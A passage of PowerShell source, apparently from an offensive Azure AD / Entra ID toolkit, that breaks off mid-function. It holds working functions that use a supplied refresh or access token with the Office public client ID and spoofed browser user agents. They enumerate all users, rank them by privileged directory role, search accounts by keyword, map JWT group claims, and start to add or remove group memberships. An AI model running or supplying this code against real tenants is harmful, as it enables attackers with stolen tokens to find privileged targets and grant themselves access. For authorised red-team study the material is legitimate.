        "9360feb5-f418-4baa-8175-e2a00bac4301" = @{ Name = "Directory Writers";                     Desc = "Can read and write basic directory information. For granting access to applications." }
        "88d8e3e3-8f55-4a1e-953a-9b9898b8876b" = @{ Name = "Directory Readers";                     Desc = "Can read basic directory information. Commonly used to grant directory read access to applications and guests." }
        "d29b2b05-8046-44ba-8758-1e26182fcf32" = @{ Name = "Directory Synchronization Accounts";    Desc = "Only used by Azure AD Connect service." }
        "2b745bdf-0803-4d80-aa65-822c4493daac" = @{ Name = "Office Apps Administrator";             Desc = "Can manage Office apps cloud services, including policy and settings management." }
        "11648597-926c-4cf3-9c36-bcebb0ba8dcc" = @{ Name = "Power Platform Administrator";          Desc = "Can create and manage all aspects of Microsoft Dynamics 365, PowerApps and Microsoft Flow." }
        "e6d1a23a-da11-4be4-9570-befc86d067a7" = @{ Name = "Compliance Administrator";              Desc = "Can read and manage compliance configuration and reports in Azure AD and Office 365." }
        "17315797-102d-40b4-93e0-432062caca18" = @{ Name = "Compliance Data Administrator";         Desc = "Creates and manages compliance content." }
        "be2f45a1-457d-42af-a067-6ec1fa63bc45" = @{ Name = "External Identity Provider Administrator"; Desc = "Can configure identity providers for use in direct federation." }
        "cf1c38e5-3621-4004-a7cb-879624dced7c" = @{ Name = "Application Developer";                 Desc = "Can create application registrations independent of the 'Users can register applications' setting." }
        "5c4f9dcd-47dc-4cf7-8c9a-9e4207cbfc91" = @{ Name = "Customer LockBox Access Approver";     Desc = "Can approve Microsoft support requests to access customer organizational data." }
        "44367163-eba1-44c3-98af-f5787879f96a" = @{ Name = "Directory Readers";                     Desc = "Can read basic directory information." }
        "a9ea8996-122f-4c74-9520-8edcd192826c" = @{ Name = "Attack Payload Author";                 Desc = "Can create attack payloads that an administrator can initiate later." }
        "c430b396-e693-46cc-96e3-2163dd604615" = @{ Name = "Attack Simulation Administrator";       Desc = "Can create and manage all aspects of attack simulation campaigns." }
        "7698a772-787b-4ac8-901f-60d6b08affd2" = @{ Name = "Cloud Device Administrator";            Desc = "Full access to manage devices in Azure AD." }
        "b5a8dcf3-09d5-43a9-a639-8e29ef291470" = @{ Name = "Knowledge Administrator";              Desc = "Can configure knowledge, learning, and other intelligent features." }
        "744ec460-397e-42ad-a462-8b3f9747a02c" = @{ Name = "Knowledge Manager";                     Desc = "Can organize, create, manage, and promote topics and knowledge." }
        "8835291a-918c-4fd7-a9ce-faa49f0cf7d9" = @{ Name = "Teams Communications Administrator";   Desc = "Can manage calling and meetings features within the Microsoft Teams service." }
        "f70938a0-fc10-4177-9e90-2178f8765737" = @{ Name = "Teams Communications Support Specialist"; Desc = "Can troubleshoot communications issues within Teams using basic tools." }
        "3d762c5a-1b6c-493f-843e-55a3b42923d4" = @{ Name = "Teams Devices Administrator";          Desc = "Can perform management related tasks on Teams certified devices." }
        "2af84b1e-32c8-42b7-82bc-daa82404023b" = @{ Name = "Tenant Creator";                       Desc = "Create new Azure AD or Azure AD B2C tenants." }
        "75941009-915a-4869-abe7-691bff18279e" = @{ Name = "Guest User";                            Desc = "Default role for guest users. Can read a limited set of directory information." }
        "10dae51f-b6af-4016-8d66-8c2a99b929b3" = @{ Name = "Guest Inviter";                        Desc = "Can invite guest users independent of the 'members can invite guests' setting." }
        "ac16e43d-7b2d-40e0-ac05-243ff356ab5b" = @{ Name = "Message Center Privacy Reader";        Desc = "Can read security messages and updates in Office 365 Message Center only." }
        "790c1fb9-7f7d-4f88-86a1-ef1f95c05c1b" = @{ Name = "Message Center Reader";                Desc = "Can read messages and updates for their organization in Office 365 Message Center only." }
        "4a5d8f65-41da-4de4-8968-e035b65339cf" = @{ Name = "Reports Reader";                       Desc = "Can read sign-in and audit reports." }
        "7495fdc4-34c4-4d15-a289-98788ce399fd" = @{ Name = "Azure Information Protection Administrator"; Desc = "Can manage all aspects of the Azure Information Protection product." }
        "38a96431-2bdf-4b4c-8b6e-5d3d8abac1a4" = @{ Name = "Desktop Analytics Administrator";      Desc = "Can access and manage Desktop management tools and services." }
        "4c730a1d-cc22-44af-8f9f-4f690c33e546" = @{ Name = "Fabric Administrator";                 Desc = "Can manage all aspects of the Fabric and Power BI products." }
        "a72c8cde-fc0b-4e47-892c-08e34dbb01f6" = @{ Name = "Search Administrator";                 Desc = "Can create and manage all aspects of Microsoft Search settings." }
        "0526716b-113d-4c15-b2c8-68e3c22b9f80" = @{ Name = "Search Editor";                        Desc = "Can create and manage the editorial content such as bookmarks, Q&As, locations, floor plans." }
        "eb1f4a8d-243a-41f0-9fbd-c7cdf6c5ef7c" = @{ Name = "Insights Administrator";               Desc = "Has administrative access in the Microsoft 365 Insights app." }
        "31392ffb-586c-42d1-9346-e59415a2cc4e" = @{ Name = "Exchange Recipient Administrator";      Desc = "Can create or update Exchange Online recipients within the Exchange Online organization." }
        "e3973bdf-4987-49ae-837a-ba8e231c7286" = @{ Name = "Azure DevOps Administrator";           Desc = "Can manage Azure DevOps organization policy and settings." }
        "74ef975b-6605-40af-a5d2-b9539d836353" = @{ Name = "Kaizala Administrator";                Desc = "Can manage settings for Microsoft Kaizala." }
        "f023fd81-a637-4b56-95fd-791ac0226033" = @{ Name = "Service Support Administrator";        Desc = "Can read service health information and manage support tickets." }
        "aaf43236-0c0d-4d5f-883a-6955382ac081" = @{ Name = "B2C IEF Keyset Administrator";        Desc = "Can manage secrets for federation and encryption in the Identity Experience Framework (IEF)." }
        "3edaf663-341e-4475-9f94-5c398ef6c070" = @{ Name = "B2C IEF Policy Administrator";        Desc = "Can create and manage trust framework policies in the Identity Experience Framework (IEF)." }
        "baf37b3a-610e-45da-9e62-d9d1e5e8914b" = @{ Name = "Teams Communications Administrator";   Desc = "Can manage calling and meetings features within the Microsoft Teams service." }
        "e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8" = @{ Name = "Attribute Definition Administrator";   Desc = "Define and manage the definition of custom security attributes." }
        "58a13ea3-c632-46ae-9ee0-9c0d43cd7f3d" = @{ Name = "Attribute Assignment Administrator";    Desc = "Assign custom security attribute keys and values to supported Azure AD objects." }
        "0964bb5e-9bdb-4d7b-ac29-58e794862a40" = @{ Name = "Authentication Extensibility Administrator"; Desc = "Customize sign in and sign up experiences for users by creating and managing custom authentication extensions." }
        "25a516ed-2fa0-40ea-a2d0-12923a21473a" = @{ Name = "Attribute Definition Reader";           Desc = "Read the definition of custom security attributes." }
        "ffd52fa5-98dc-465c-991d-fc073eb59f8f" = @{ Name = "Attribute Assignment Reader";           Desc = "Read custom security attribute keys and values for supported Azure AD objects." }
        "8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2" = @{ Name = "Hybrid Identity Administrator";        Desc = "Can manage AD to Azure AD cloud provisioning, Azure AD Connect, and federation settings." }
        "45d8d3c5-c802-45c6-b32a-1d70b5e1e86e" = @{ Name = "Identity Governance Administrator";    Desc = "Manage access using Azure AD for identity governance scenarios." }
    }

    function Invoke-SmartRequest {
        param (
            [string]$Method,
            [string]$Uri,
            [hashtable]$Headers,
            [string]$Body = $null,
            [string]$ContentType = $null,
            [int]$MaxRetries = 15 
        )
        
        $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        if (-not $Headers.ContainsKey("User-Agent")) {
            $Headers.Add("User-Agent", $UserAgent)
        } else {
            $Headers["User-Agent"] = $UserAgent
        }

        $RetryCount = 0
        $Success = $false
        $Response = $null

        while (-not $Success -and $RetryCount -lt $MaxRetries) {
            try {
                $RequestParams = @{ Method = $Method; Uri = $Uri; Headers = $Headers }
                if ($Body) { $RequestParams.Add('Body', $Body) }
                if ($ContentType) { $RequestParams.Add('ContentType', $ContentType) }
                
                $Response = Invoke-RestMethod @RequestParams
                $Success = $true
                
            } catch {
                $ErrorRecord = $_
                $StatusCode = if ($ErrorRecord.Exception.Response) { [int]$ErrorRecord.Exception.Response.StatusCode } else { $null }

                if ($StatusCode -eq 429) {
                    $RetryCount++
                    $RetryAfterStr = $ErrorRecord.Exception.Response.Headers["Retry-After"]
                    
                    if (-not [string]::IsNullOrWhiteSpace($RetryAfterStr)) {
                        $RetryAfter = [int]($RetryAfterStr -join '')
                        if ($RetryAfter -eq 0) { $RetryAfter = 10 * $RetryCount }
                    } else { 
                        $RetryAfter = 10 * $RetryCount 
                    }
                    
                    Write-Host "`t[!] Rate Limit Hit (429) - waiting $RetryAfter seconds" -ForegroundColor Gray
                    Start-Sleep -Seconds $RetryAfter
                } 
                elseif ($StatusCode -eq 401) {
                    Write-Host "`t[!] Access Token expired (401 Unauthorized). Attempting to refresh..." -ForegroundColor Yellow
                    if (Refresh-AllTokens) {
                        Write-Host "`t[+] Tokens refreshed successfully! Resuming..." -ForegroundColor Green
                        if ($Uri -match "management.azure.com") {
                            $Headers["Authorization"] = "Bearer $($global:ARMAccessToken)"
                        } else {
                            $Headers["Authorization"] = "Bearer $($global:GraphAccessToken)"
                        }
                        $RetryCount++
                    } else {
                        throw "[-] Token refresh failed. Please restart and re-authenticate."
                    }
                }
                elseif ($StatusCode -eq 404) {
                    Write-Host "`t[!] Resource not found (404) - $Uri" -ForegroundColor DarkGray
                    return $null
                }
                elseif ($null -eq $StatusCode -or $StatusCode -ge 500) {
                    $RetryCount++
                    $WaitTime = 5 * $RetryCount
                    Write-Host "`t[!] Transient Error ($StatusCode). Retrying in $WaitTime sec... ($RetryCount/$MaxRetries)" -ForegroundColor Yellow
                    Start-Sleep -Seconds $WaitTime
                }   
                else {
                    throw $ErrorRecord 
                }
            }
        }
        if (-not $Success) { throw "[-] API request to $Uri failed permanently after $MaxRetries retries." }  
        return $Response
    }

    function Help {
        Write-Host "Invoke-FindUserRole" -ForegroundColor DarkYellow
        Write-Host "    Usage: Invoke-FindUserRole -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkCyan
        Write-Host "    Usage with Service-Principal: Invoke-FindUserRole -DomainName ShkudW.com -AccessToken 'eyJ0eX......'" -ForegroundColor DarkCyan
    }

    if (-not $RefreshToken -and -not $DomainName -and -not $AccessToken) {
        Help
        return
    }

    if ($AccessToken -and $RefreshToken) {
        Write-Host "[-] Can't use RefreshToken and AccessToken together." -ForegroundColor Red
        return
    }

    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }

    function Get-DomainName {
        try {
            $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration" -Headers $headers
            $TenantID = ($response.issuer -split "/")[3]
            Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
            Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
            return $TenantID
        } catch {
            Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
            return $null
        }
    } 

    if ($DomainName) {
        $TenantID = Get-DomainName -DomainName $DomainName
        if (-not $TenantID) {
            Write-Error "[-] Cannot continue without Tenant ID."
            return
        }
    }

    function Get-Token-WithRefreshToken {
        param(
            [string]$RefreshToken,
            [string]$TenantID
        )

        $tokenUrl = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
        $body = @{
            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "scope" = "https://graph.microsoft.com/.default"
            "grant_type" = "refresh_token"
            "refresh_token" = $RefreshToken
        }
        $Resp = Invoke-SmartRequest -Method POST -Uri $tokenUrl -Body $body -Headers $headers
        return $Resp.access_token
    }

    if ($AccessToken -and -not $RefreshToken) {
        $headers = @{
            Authorization = "Bearer $AccessToken"
            "Content-Type" = "application/json"
            "User-Agent" = $UserAgent
        }
    }

    if ($RefreshToken -and -not $AccessToken) {
        $AccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
        $headers = @{
            Authorization = "Bearer $AccessToken"
            "Content-Type" = "application/json"
            "User-Agent" = $UserAgent
        }
    }


    $roleLookup = @{}

    Write-Host "`n[*] Fetching directory role definitions..." -ForegroundColor Cyan

    try {
        $rolesResp = Invoke-SmartRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/directoryRoles?`$select=id,displayName,description,roleTemplateId" -Headers $headers
        foreach ($r in $rolesResp.value) {
            $roleLookup[$r.id] = @{
                Name        = $r.displayName
                Description = $r.description
                TemplateId  = $r.roleTemplateId
            }
        }
        Write-Host "[+] Loaded $($roleLookup.Count) active directory role(s) from API" -ForegroundColor Green
    } catch {
        Write-Host "[!] Bulk /directoryRoles fetch failed (likely 403). Will resolve per-role." -ForegroundColor Yellow
    }

   
    function Resolve-RoleInfo {
        param($RoleObj)

        $rid = $RoleObj.id
        $templateId = $RoleObj.roleTemplateId

     
        if ($roleLookup.ContainsKey($rid) -and -not [string]::IsNullOrWhiteSpace($roleLookup[$rid].Name)) {
            return $roleLookup[$rid]
        }

    
        if (-not [string]::IsNullOrWhiteSpace($RoleObj.displayName)) {
            $info = @{ Name = $RoleObj.displayName; Description = $RoleObj.description; TemplateId = $templateId }
            $roleLookup[$rid] = $info
            return $info
        }

      
        if (-not [string]::IsNullOrWhiteSpace($templateId) -and $RoleTemplateMap.ContainsKey($templateId)) {
            $mapped = $RoleTemplateMap[$templateId]
            $info = @{ Name = $mapped.Name; Description = $mapped.Desc; TemplateId = $templateId }
            $roleLookup[$rid] = $info
            return $info
        }

      
        try {
            $singleRole = Invoke-SmartRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/directoryRoles/$rid" -Headers $headers
            $rName = $singleRole.displayName
            $rDesc = $singleRole.description
            $rTmpl = $singleRole.roleTemplateId

            if ([string]::IsNullOrWhiteSpace($rName) -and -not [string]::IsNullOrWhiteSpace($rTmpl) -and $RoleTemplateMap.ContainsKey($rTmpl)) {
                $rName = $RoleTemplateMap[$rTmpl].Name
                $rDesc = $RoleTemplateMap[$rTmpl].Desc
            }

            if (-not [string]::IsNullOrWhiteSpace($rName)) {
                $info = @{ Name = $rName; Description = $rDesc; TemplateId = $rTmpl }
                $roleLookup[$rid] = $info
                return $info
            }
        } catch { }

    
        $fallback = @{ Name = "Unknown Role ($rid)"; Description = "No description available"; TemplateId = $templateId }
        $roleLookup[$rid] = $fallback
        return $fallback
    }


    $allUsers = @()
    $uri = "https://graph.microsoft.com/v1.0/users"

    Write-Host "`n[*] Fetching users..." -ForegroundColor Cyan

    while ($uri) {
        try {
            $response = Invoke-SmartRequest -Method GET -Uri $uri -Headers $headers
            $allUsers += $response.value
            $uri = $response.'@odata.nextLink'
        } catch {
            Write-Host "[-] Failed to fetch users: $_" -ForegroundColor Red
            break
        }
    }

    Write-Host "[*] Total users fetched: $($allUsers.Count)" -ForegroundColor Cyan

 
    $usersWithRoles = @()
    $usersNoRoles   = 0

    foreach ($user in $allUsers) {
        $id  = $user.id
        $upn = $user.userPrincipalName

        Write-Host "`n[*] Checking roles for: $upn" -ForegroundColor Cyan

        $roleUri = "https://graph.microsoft.com/v1.0/users/$id/transitiveMemberOf/microsoft.graph.directoryRole"

        try {
            $roleResponse = Invoke-SmartRequest -Method GET -Uri $roleUri -Headers $headers
            $roles = $roleResponse.value

            if (-not $roles -or $roles.Count -eq 0) {
                $usersNoRoles++
                continue
            }

            $roleDetails = @()
            foreach ($role in $roles) {
                $info = Resolve-RoleInfo -RoleObj $role
                $roleDetails += [PSCustomObject]@{
                    Name        = $info.Name
                    Description = $info.Description
                }
            }

            Write-Host "[+] $upn - $($roleDetails.Count) role(s) found" -ForegroundColor Green

            $usersWithRoles += [PSCustomObject]@{
                UPN      = $upn
                ObjectId = $id
                Roles    = $roleDetails
            }

        } catch {
            Write-Host "[-] Failed to fetch roles for $upn : $_" -ForegroundColor Red
        }
    }


    Write-Host ""
    Write-Host "------------------------------------------------------"
    Write-Host "  Total Users Scanned    : $($allUsers.Count)" -ForegroundColor White
    Write-Host "  Users WITH Roles       : $($usersWithRoles.Count)" -ForegroundColor Green
    Write-Host "  Users WITHOUT Roles    : $usersNoRoles" -ForegroundColor DarkGray
    Write-Host ""
	Write-Host "------------------------------------------------------"

    if ($usersWithRoles.Count -gt 0) {

    
        $CriticalRoles = @(
            "Global Administrator",
            "Privileged Role Administrator",
            "Privileged Authentication Administrator",
            "Partner Tier2 Support"
        )
        $HighRoles = @(
            "User Administrator",
            "Exchange Administrator",
            "SharePoint Administrator",
            "Intune Administrator",
            "Application Administrator",
            "Cloud Application Administrator",
            "Authentication Administrator",
            "Conditional Access Administrator",
            "Security Administrator",
            "Helpdesk Administrator",
            "Groups Administrator",
            "Password Administrator",
            "Billing Administrator",
            "License Administrator",
            "Teams Administrator",
            "Security Reader",
            "Global Reader",
            "Hybrid Identity Administrator",
            "Identity Governance Administrator",
            "Fabric Administrator"
        )

        $critical = @()
        $high     = @()
        $standard = @()

        foreach ($u in $usersWithRoles) {
            $maxLevel = "Standard"
            foreach ($r in $u.Roles) {
                if ($CriticalRoles -contains $r.Name) { $maxLevel = "Critical"; break }
                if ($HighRoles     -contains $r.Name) { $maxLevel = "High" }
            }
            switch ($maxLevel) {
                "Critical" { $critical += $u }
                "High"     { $high     += $u }
                default    { $standard += $u }
            }
        }

 
        function Show-Tier {
            param(
                [string]$Label,
                [string]$Color,
                [array]$Users
            )
            if ($Users.Count -eq 0) { return }

            Write-Host ""
            Write-Host "  [$Label] - $($Users.Count) user(s)" -ForegroundColor $Color
            Write-Host ("  " + "-" * 96) -ForegroundColor DarkGray

            foreach ($u in $Users) {
                Write-Host ""
                Write-Host "    UPN       : $($u.UPN)" -ForegroundColor White
                Write-Host "    ObjectId  : $($u.ObjectId)" -ForegroundColor DarkGray
                Write-Host "    Roles     :" -ForegroundColor White
                foreach ($r in $u.Roles) {
                    $roleColor = "Yellow"
                    if ($CriticalRoles -contains $r.Name) {
						$roleColor = "Red" 
					}
                    elseif ($HighRoles  -contains $r.Name) {
						$roleColor = "DarkYellow" 
					}
                    Write-Host "              [Role]  $($r.Name)" -ForegroundColor $roleColor
                    
                }
            }
        }

        Show-Tier -Label "CRITICAL PRIVILEGE" -Color Red -Users $critical
        Show-Tier -Label "HIGH PRIVILEGE" -Color DarkYellow -Users $high
        Show-Tier -Label "STANDARD ROLES" -Color White -Users $standard

    } else {
        Write-Host ""
        Write-Host "  [!] No users with assigned roles found." -ForegroundColor DarkGray
    }

}


<######################################################################################################################################################>
<######################################################################################################################################################>


function Invoke-FindUserByWord {


    param(
        [string]$RefreshToken,
		[string]$DomainName,
		[string]$Word
    )


        function Help {
			Write-Host "Invoke-FindUserByWord" -ForegroundColor DarkYellow
			Write-Host "    Usage: Invoke-FindUserByWord -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......' -Word 'sqladmin' " -ForegroundColor DarkCyan
		}

            if (-not $RefreshToken -and -not $DomainName -and -not $Word) {
                Help
                return
            }

            if ($RefreshToken -and $DomainName -and -not $Word) {
                Write-Host "[!] You need to provide a Work to search" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }


	    $OutputFile = "FoundUsers.txt"
	    if (Test-Path $OutputFile) {
			Remove-Item $OutputFile -Force 
		}


        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $headers = @{ 'User-Agent' = $UserAgent }

		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration" -Headers $headers
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		} 


        if (-not $TenantID -and $DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }


        function Get-Token-WithRefreshToken {
                param(
                    [string]$RefreshToken,
                    [string]$TenantID
                )

                    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                    $body = @{
                        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope" = "https://graph.microsoft.com/.default"
                        "grant_type" = "refresh_token"
                        "refresh_token" = $RefreshToken
                    }
                    return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
            }


        if($RefreshToken) {
            $AccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
        }
    

        $TokenStartTime = Get-Date
        $UsersUrl = "https://graph.microsoft.com/v1.0/users"
        $BeesUsers = @()

        while ($UsersUrl) {
        
            if ((New-TimeSpan -Start $TokenStartTime).TotalMinutes -ge 7) {
                Write-Host "[*] Refreshing Access Token..." -ForegroundColor Cyan
                $AccessToken = Get-AccessTokenFromRefresh
                if (-not $AccessToken) { break }
                $TokenStartTime = Get-Date
            }

            $Headers = @{
                "Authorization" = "Bearer $AccessToken"
                "Content-Type" = "application/json"
                "User-Agent" ="$UserAgent"
            }

            try {
                $Response = Invoke-RestMethod -Method Get -Uri $UsersUrl -Headers $Headers -ErrorAction Stop

                foreach ($User in $Response.value) {
                    if (
                        ($User.displayName -like "*$Word*" -or
                        $User.mail -like "*$Word*" -or
                        $User.userPrincipalName -like "*$Word*" -or
                        $User.givenName -like "*$Word*" -or
                        $User.surname -like "*$Word*")
                    ) {
					    $BeesUsers += $User
                        $Line = "$($User.displayName) | $($User.userPrincipalName)"
                        Add-Content -Path $OutputFile -Value $Line
                        Write-Host ""
                        Write-Host "[+] Found: " -NoNewline
                        Write-Host "$($User.displayName)" -ForegroundColor Green -NoNewline
                        Write-Host " | $($User.userPrincipalName)" -ForegroundColor DarkGray
                    }
                }

                $UsersUrl = $Response.'@odata.nextLink'
            } catch {
                    if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if ($retryAfter) {
                            Write-Host "[!] Rate limit hit. Retrying after $retryAfter seconds..." -ForegroundColor Yellow
                            Start-Sleep -Seconds ([int]$retryAfter)
                        } else {
                            Write-Host "[!] Rate limit hit. Retrying after default 60 seconds..." -ForegroundColor Yellow
                            Start-Sleep -Seconds 60
                        }
                    } else {
                        Write-Warning "Failed to retrieve users: $_"
                        break
                    }
                }
        }

    return $BeesUsers
}


<######################################################################################################################################################>
<######################################################################################################################################################>

function Invoke-GroupMappingFromJWT {


    param (
        [string]$jwt,
        [string]$GraphAccessToken
    )

        function Help {
			Write-Host "Invoke-GroupMappingFromJWT" -ForegroundColor DarkYellow
			Write-Host "    Usage: Invoke-GroupMappingFromJWT -jwt 'eyJ0eXAiOiJKV1QiLCJhb.....' -GraphAccessToken 'eyJ0eXAiOiJKV1QiLCJub2....' " -ForegroundColor DarkCyan
		}

            if (-not $jwt -and -not $GraphAccessToken) {
                Help
                return
            }

        function Decode-JWT {
            param ([string]$Token)
            $tokenParts = $Token.Split('.')
            if ($tokenParts.Length -lt 2) {
                throw "Invalid JWT format"
            }

            $payload = $tokenParts[1].Replace('-', '+').Replace('_', '/')
            switch ($payload.Length % 4) {
                2 { $payload += "==" }
                3 { $payload += "=" }
                1 { $payload += "===" }
            }

            $bytes = [System.Convert]::FromBase64String($payload)
            $json = [System.Text.Encoding]::UTF8.GetString($bytes)
            return $json | ConvertFrom-Json
        }   

        Write-Host "`n[*] Decoding JWT..." -ForegroundColor Cyan
        $DecodedToken = Decode-JWT -Token $jwt

        if (-not $DecodedToken.groups) {
            Write-Host "[-] No 'groups' claim found in the token." -ForegroundColor Red
            return
        }

        $GroupIds = $DecodedToken.groups
        Write-Host "[*] Found $($GroupIds.Count) groups in token. Resolving via Graph..." -ForegroundColor Cyan

        foreach ($gid in $GroupIds) {
            $groupUrl = "https://graph.microsoft.com/v1.0/groups/$gid"
            $roleUrl = "https://graph.microsoft.com/v1.0/directoryRoles"
            $headers = @{ 
                'Authorization' = "Bearer $GraphAccessToken" 
                'User-Agent' = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                }
            $RetryCount = 0
            $MaxRetries = 5

            while ($RetryCount -lt $MaxRetries) {
                try {
                    $group = Invoke-RestMethod -Uri $groupUrl -Headers $headers -Method GET -ErrorAction Stop
                    Write-Host "`n[+] $($group.displayName) ($gid)" -ForegroundColor Green
                    if ($group.groupTypes -contains "Unified") {
						Write-Host "    [Type] Microsoft 365 Group (Unified)" -ForegroundColor DarkCyan
					} elseif ($group.securityEnabled -eq $true) {
						Write-Host "    [Type] Security Group" -ForegroundColor DarkCyan
					} else {
						Write-Host "    [Type] Unknown / Other" -ForegroundColor DarkCyan
					}

               
                    $appRoleUrl = "https://graph.microsoft.com/v1.0/groups/$gid/appRoleAssignments"
                    $appRoles = Invoke-RestMethod -Uri $appRoleUrl -Headers $headers -Method GET -ErrorAction Stop
                    if ($appRoles.value.Count -eq 0) {
                        Write-Host "    [AppRoleAssignment] None" -ForegroundColor DarkGray
                    } else {
                        foreach ($app in $appRoles.value) {
                            Write-Host "    [AppRoleAssignment] ResourceId: $($app.resourceId) - RoleId: $($app.appRoleId)" -ForegroundColor Magenta
                        }
                    }

                
                    $roles = Invoke-RestMethod -Uri $roleUrl -Headers $headers -Method GET -ErrorAction Stop
                    $matchingRole = $roles.value | Where-Object { $_.members -contains "https://graph.microsoft.com/v1.0/groups/$gid" }

                    if ($matchingRole) {
                        Write-Host "    [Directory Role] $($matchingRole.displayName)" -ForegroundColor Yellow
                    } else {
                        Write-Host "    [Directory Role] None" -ForegroundColor DarkGray
                    }
                    break
                } catch {
                    $response = $_.Exception.Response
                    if ($response -and $response.StatusCode.value__ -eq 429) {
                        $retryAfter = 20
                        Write-Host "[!] Rate limited (429) - retrying in $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds $retryAfter
                        $RetryCount++
                    } else {
                        Write-Host "[-] Could not resolve group: $gid" -ForegroundColor DarkGray
                        break
                    }
                }
            }
        Start-Sleep -Milliseconds 300
        }
}

<######################################################################################################################################################>
<######################################################################################################################################################>


function Invoke-MembershipChange {


    param(
        	[Parameter(Mandatory = $false)][string]$RefreshToken,
		    [Parameter(Mandatory = $false)][string]$ClientID,
		    [Parameter(Mandatory = $false)][string]$ClientSecret,
		    [Parameter(Mandatory = $false)][string]$UserID,
		    [string]$DomainName,
        	[Parameter(Mandatory)][ValidateSet("add", "delete")][string]$Action,
        	[string]$GroupIdsInput,
        	[string]$SuccessLogFile = ".\\success_log.txt",
		    [string]$SuccessRenoveLogFile = ".\\success_Remove_log.txt"
		
    )

        function Help {
			Write-Host "Invoke-MembershipChange" -ForegroundColor DarkYellow
 			Write-Host "    Without getting any 'UserID' it will use you UserID from AccessToken" -ForegroundColor DarkYellow          
			Write-Host "    Usage: Invoke-MembershipChange -DomainName ShkudW.com -RefreshToken 'eyJ0eXAiOiJKV1QiLCJhb.....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkCyan
			Write-Host "         : Invoke-MembershipChange -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkCyan
 			Write-Host "    With getting 'UserID'" -ForegroundColor DarkYellow  
			Write-Host "    Usage: Invoke-MembershipChange -DomainName ShkudW.com  -UserID <User-ID> -RefreshToken 'eyJ0eXAiOiJKV1QiLCJhb.....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkCyan
           	Write-Host "         : Invoke-MembershipChange -DomainName ShkudW.com  -UserID <User-ID> -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....' -GroupIdsInput <GroupID | C:\Path-To-File\Groupids.txt> -Action Add | Delete " -ForegroundColor DarkCyan



		}

            if (-not $RefreshToken -and -not $ClientID -and -not $ClientSecret -and -not $UserID -and -not $DomainName -and -not $Action) {
                Help
                return
            }

            if ($RefreshToken -and $ClientID -and $ClientSecret) {
                Write-Host "[!] You are can not provide Refresh Token and ClientID+ClientSecret together" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }

        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $headers = @{ 'User-Agent' = $UserAgent }

		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration" -Headers $headers
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		} 


        if (-not $TenantID -and $DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }


		function Get-Token-WithRefreshToken {
		param(
        		[string]$RefreshToken,
        		[string]$TenantID
		)
		
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
